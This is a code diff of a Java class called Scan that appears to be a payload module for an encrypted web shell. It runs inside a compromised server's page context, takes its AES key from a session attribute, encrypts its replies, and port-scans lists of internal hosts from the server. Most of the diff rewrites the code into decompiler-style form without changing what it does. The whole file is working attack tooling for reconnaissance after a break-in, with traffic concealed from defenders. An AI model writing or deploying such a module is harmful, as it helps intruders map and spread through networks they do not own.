@@ -11,7 +11,6 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
-import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 
@@ -36,44 +35,61 @@ public class Scan implements Runnable {
         this.Response = page.getResponse();
         this.Request = page.getRequest();
         page.getResponse().setCharacterEncoding("UTF-8");
-        Map<String, String> result = new HashMap<>();
-        try {
-            new Thread(new Scan(this.Session)).start();
-            result.put("msg", "扫描任务提交成功");
-            result.put("status", "success");
+        HashMap result = new HashMap();
+        boolean var12 = false;
+
+        ServletOutputStream so;
+        label77:
+        {
             try {
-                ServletOutputStream so = this.Response.getOutputStream();
-                so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                var12 = true;
+                (new Thread(new Scan(this.Session))).start();
+                result.put("msg", "扫描任务提交成功");
+                result.put("status", "success");
+                var12 = false;
+                break label77;
+            } catch (Exception var16) {
+                result.put("msg", var16.getMessage());
+                result.put("status", "fail");
+                var12 = false;
+            } finally {
+                if (var12) {
+                    try {
+                        so = this.Response.getOutputStream();
+                        so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                        so.flush();
+                        so.close();
+                        page.getOut().clear();
+                    } catch (Exception var13) {
+                        var13.printStackTrace();
+                    }
+
+                }
+            }
+
+            try {
+                so = this.Response.getOutputStream();
+                so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                 so.flush();
                 so.close();
                 page.getOut().clear();
-            } catch (Exception e) {
-                e.printStackTrace();
+            } catch (Exception var14) {
+                var14.printStackTrace();
             }
-        } catch (Exception e2) {
-            result.put("msg", e2.getMessage());
-            result.put("status", "fail");
-            try {
-                ServletOutputStream so2 = this.Response.getOutputStream();
-                so2.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                so2.flush();
-                so2.close();
-                page.getOut().clear();
-            } catch (Exception e3) {
-                e3.printStackTrace();
-            }
-        } catch (Throwable th) {
-            try {
-                ServletOutputStream so3 = this.Response.getOutputStream();
-                so3.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                so3.flush();
-                so3.close();
-                page.getOut().clear();
-            } catch (Exception e4) {
-                e4.printStackTrace();
-            }
-            throw th;
+
+            return true;
         }
+
+        try {
+            so = this.Response.getOutputStream();
+            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+            so.flush();
+            so.close();
+            page.getOut().clear();
+        } catch (Exception var15) {
+            var15.printStackTrace();
+        }
+
         return true;
     }
 
@@ -81,75 +97,102 @@ public class Scan implements Runnable {
         try {
             String[] ips = ipList.split(",");
             String[] ports = portList.split(",");
-            Map<String, String> sessionObj = new HashMap<>();
-            Map<String, String> scanResult = new HashMap<>();
+            Map sessionObj = new HashMap();
+            Map scanResult = new HashMap();
             sessionObj.put("running", "true");
-            for (String ip : ips) {
-                for (String port : ports) {
+            String[] var5 = ips;
+            int var6 = ips.length;
+
+            for (int var7 = 0; var7 < var6; ++var7) {
+                String ip = var5[var7];
+                String[] var9 = ports;
+                int var10 = ports.length;
+
+                for (int var11 = 0; var11 < var10; ++var11) {
+                    String port = var9[var11];
+
                     try {
                         Socket socket = new Socket();
                         socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                         socket.close();
                         scanResult.put(ip + ":" + port, "open");
-                    } catch (Exception e) {
+                    } catch (Exception var14) {
                         scanResult.put(ip + ":" + port, "closed");
                     }
-                    sessionObj.put("result", buildJson(scanResult, false));
+
+                    sessionObj.put("result", this.buildJson(scanResult, false));
                     this.Session.setAttribute(taskID, sessionObj);
                 }
             }
+
             sessionObj.put("running", "false");
-        } catch (Exception e2) {
-            e2.printStackTrace();
+        } catch (Exception var15) {
+            var15.printStackTrace();
         }
+
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
-        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
+        String key = this.Session.getAttribute("u").toString();
+        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(1, skeySpec);
-        return cipher.doFinal(bs);
+        byte[] encrypted = cipher.doFinal(bs);
+        return encrypted;
     }
 
-    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+    private String buildJson(Map entity, boolean encode) throws Exception {
         StringBuilder sb = new StringBuilder();
         String version = System.getProperty("java.version");
         sb.append("{");
-        for (String key : entity.keySet()) {
+
+        for (Object o : entity.keySet()) {
+            String key = (String) o;
             sb.append("\"" + key + "\":\"");
-            String value = entity.get(key);
+            String value = ((String) entity.get(key));
             if (encode) {
+                Class Base64;
+                Object Encoder;
                 if (version.compareTo("1.9") >= 0) {
-                    getClass();
-                    Class Base64 = Class.forName("java.util.Base64");
-                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
+                    this.getClass();
+                    Base64 = Class.forName("java.util.Base64");
+                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                     value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
-                    getClass();
-                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
+                    this.getClass();
+                    Base64 = Class.forName("sun.misc.BASE64Encoder");
+                    Encoder = Base64.newInstance();
+                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
+                    value = value.replace("\n", "").replace("\r", "");
                 }
             }
+
             sb.append(value);
             sb.append("\",");
         }
+
         if (sb.toString().endsWith(",")) {
             sb.setLength(sb.length() - 1);
         }
+
         sb.append("}");
         return sb.toString();
     }
 
-    private String buildJsonArray(List<Map<String, String>> entityList, boolean encode) throws Exception {
+    private String buildJsonArray(List entityList, boolean encode) throws Exception {
         StringBuilder sb = new StringBuilder();
         sb.append("[");
-        Iterator<Map<String, String>> it = entityList.iterator();
-        while (it.hasNext()) {
-            sb.append(buildJson(it.next(), encode) + ",");
+
+        for (Object o : entityList) {
+            Map entity = (Map) o;
+            sb.append(this.buildJson(entity, encode) + ",");
         }
+
         if (sb.toString().endsWith(",")) {
             sb.setLength(sb.length() - 1);
         }
+
         sb.append("]");
         return sb.toString();
     }
